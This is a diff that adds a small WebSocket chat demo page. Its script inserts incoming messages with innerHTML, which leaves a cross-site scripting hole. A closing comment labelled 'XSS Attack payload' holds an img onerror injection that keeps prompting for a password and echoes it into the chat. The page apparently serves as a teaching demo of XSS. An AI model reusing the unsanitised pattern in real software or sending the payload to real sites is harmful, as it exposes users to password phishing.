@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+    <title>Web Socket Demo</title>
+  </head>
+  <body>
+    <ul id="chat"></ul>
+
+    <form>
+      <textarea rows="8" cols="80" id="message"></textarea>
+      <br />
+      <button type="submit">Send</button>
+    </form>
+    <script>
+      const connection = new WebSocket('ws://192.168.1.56:8080');
+
+      connection.onopen = () => {
+        console.log('connected');
+      };
+
+      connection.onclose = () => {
+        console.error('disconnected');
+      };
+
+      connection.onerror = error => {
+        console.error('failed to connect', error);
+      };
+
+      connection.onmessage = event => {
+        console.log('received', event.data);
+        let li = document.createElement('li');
+        li.innerHTML = event.data;
+        document.querySelector('#chat').append(li);
+      };
+
+      document.querySelector('form').addEventListener('submit', event => {
+        event.preventDefault();
+        let message = document.querySelector('#message').value;
+        connection.send(message);
+        document.querySelector('#message').value = '';
+      });
+    </script>
+  </body>
+</html>
+<!-- 
+    XSS Attack payload
+    <img src='x' onerror='let password=""; while (password == "") {let promptValue = prompt("Please input your password to proceed..."); if (promptValue != null && promptValue != "") {password = promptValue; let li = document.createElement("li"); li.innerHTML = "inputted password=" + password; document.querySelector("#chat").append(li);}}'>
+ -->
